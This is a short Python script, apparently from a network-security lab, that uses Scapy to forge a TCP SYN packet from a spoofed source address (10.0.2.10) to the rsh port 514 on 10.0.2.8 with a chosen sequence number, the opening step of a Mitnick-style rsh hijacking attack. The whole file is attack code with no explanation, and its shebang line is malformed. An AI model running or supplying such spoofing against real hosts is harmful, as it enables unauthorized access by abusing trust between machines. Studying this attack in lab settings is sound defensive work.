#!usr/bin/python3
from scapy.all import *
import sys

print("Sending Spoofed SYN Packet ...")
IPLayer = IP(src="10.0.2.10", dst="10.0.2.8")
TCPLayer = TCP(sport=1023,dport=514,flags="S", seq=778933536)
pkt = IPLayer/TCPLayer
send(pkt,verbose=0)
